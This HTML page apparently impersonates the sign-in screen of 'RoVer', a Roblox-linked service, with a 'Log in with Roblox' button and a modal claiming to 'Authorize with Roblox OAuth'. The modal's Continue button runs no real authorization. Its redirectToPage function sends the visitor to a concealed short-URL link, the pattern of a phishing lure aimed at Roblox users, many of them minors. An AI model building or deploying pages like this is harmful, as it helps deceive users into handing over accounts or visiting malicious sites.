<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>RoVer</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #1e1d1f;
      color: white;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    /* Top bar */
    .navbar {
      background-color: #e6007e;
      padding: 15px;
      display: flex;
      align-items: center;
    }
    .navbar h1 {
      margin: 0;
      margin-left: 10px;
      font-size: 20px;
    }
    .menu-icon {
      font-size: 24px;
      cursor: pointer;
    }

    /* Center box */
    .card {
      background-color: #000;
      border-radius: 6px;
      padding: 30px;
      text-align: center;
      max-width: 400px;
      margin: auto;
    }
    .card h2 {
      margin-bottom: 10px;
    }
    .card p {
      color: #ccc;
      margin-bottom: 20px;
    }
    .btn {
      background-color: #e6007e;
      color: white;
      border: none;
      border-radius: 25px;
      padding: 12px 25px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .btn:hover {
      background-color: #cc006f;
    }

    /* Modal */
    .modal {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }
    .modal.show {
      opacity: 1;
      visibility: visible;
    }
    .modal-content {
      background: #111;
      padding: 25px;
      border-radius: 8px;
      text-align: center;
      width: 350px;
      transform: translateY(-50px);
      transition: all 0.3s ease;
    }
    .modal.show .modal-content {
      transform: translateY(0);
    }
    .modal h2 {
      margin-bottom: 15px;
    }
    .modal button {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    .continue-btn {
      background: #fff;
      color: #000;
    }
    .back-btn {
      background: transparent;
      border: 1px solid #444;
      color: #aaa;
    }
  </style>
</head>
<body>
  <!-- Navigation bar -->
  <div class="navbar">
    <span class="menu-icon">â˜°</span>
    <h1>RoVer</h1>
  </div>

  <!-- Center card -->
  <div class="card">
    <h2>Sign in to RoVer</h2>
    <p>You must be 13 years of age or older to continue.</p>
    <button class="btn" onclick="openModal()">Log in with Roblox</button>
  </div>

  <!-- Modal -->
  <div class="modal" id="loginModal">
    <div class="modal-content">
      <h2>Sign in to RoVer</h2>
      <p>ROBLOX<br>Authorize with Roblox OAuth</p>
      <button class="continue-btn" onclick="redirectToPage()">Continue</button>
      <button class="back-btn" onclick="closeModal()">Return to RoVer</button>
    </div>
  </div>

  <script>
    function openModal() {
      document.getElementById("loginModal").classList.add("show");
    }
    function closeModal() {
      document.getElementById("loginModal").classList.remove("show");
    }
    function redirectToPage() {
      window.location.href = "https://short-url.org/1gqpq";
    }
  </script>
</body>
</html>
